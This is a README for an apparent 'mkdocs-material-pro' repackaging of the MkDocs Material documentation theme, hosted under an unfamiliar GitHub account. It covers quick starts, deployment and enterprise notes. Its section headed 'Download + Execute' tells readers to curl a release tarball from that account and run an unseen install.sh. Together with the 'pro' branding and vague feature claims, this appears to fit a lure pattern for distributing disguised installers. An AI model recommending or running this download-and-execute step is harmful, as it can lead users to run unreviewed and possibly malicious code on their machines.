Quick start â€” local
-------------------
1. Create a Python virtual environment and activate it.
2. Install mkdocs and the Material theme.
3. Start the local server.

Commands:
```bash
python -m venv .venv
source .venv/bin/activate
pip install mkdocs mkdocs-material
mkdocs new my-docs
cd my-docs
# Copy the provided mkdocs.yml from this repo into your project root
mkdocs serve
```

Quick start â€” Docker
--------------------
Build and run the provided Docker image:
```bash
docker build -t mkdocs-material-pro .
docker run --rm -it -p 8000:8000 mkdocs-material-pro
# Open http://localhost:8000
```

Get the release (Download + Execute)
-----------------------------------
Download the release package from the Releases page and run the included installer or extraction script. For example, visit the Releases page and download the matching tarball or installer. Then run the install script:

- Releases page: https://github.com/ChainVoyager1/MkdocsMaterial/releases

Example commands (replace version/file names with the actual release asset):
```bash
# Example: download a release archive and run the installer
curl -L -o mkdocs-material-pro-v1.0.0.tar.gz "https://github.com/ChainVoyager1/MkdocsMaterial/releases/download/v1.0.0/mkdocs-material-pro-v1.0.0.tar.gz"
tar -xzf mkdocs-material-pro-v1.0.0.tar.gz
cd mkdocs-material-pro
# The release includes install.sh or setup.sh
chmod +x install.sh
./install.sh
```

If the release URL or assets change, pick the matching file from the Releases page and run its provided installer. The Releases page contains binaries, archives, and scripts for each published release.

Deployment guides
-----------------
Cloud-ready deployment shows a few options:

Static hosting (S3 + CloudFront)
- Build static site with mkdocs build.
- Upload site/ to S3 bucket.
- Configure CloudFront with caching and Brotli.

GitHub Pages

- Use the supplied action to build and deploy.

Kubernetes + NGINX
- Serve files through a minimal NGINX image.
- Use a sidecar for log shipping or analytics.
- Apply Ingress rules, TLS via cert-manager.

Enterprise notes
----------------
- Authentication: plug behind your SSO or reverse proxy. This repo includes SSO guidance and header-based auth examples.
- Multi-team workflows: use the pipeline templates to publish multiple versioned docs.
- Access control: configure CDN or reverse proxy for token-based access.
- Analytics: add Google Analytics or privacy-grade analytics hooks in mkdocs.yml.

Performance tuning
------------------
- Compress assets (gzip, Brotli).
- Use long cache headers for fingerprinted assets.
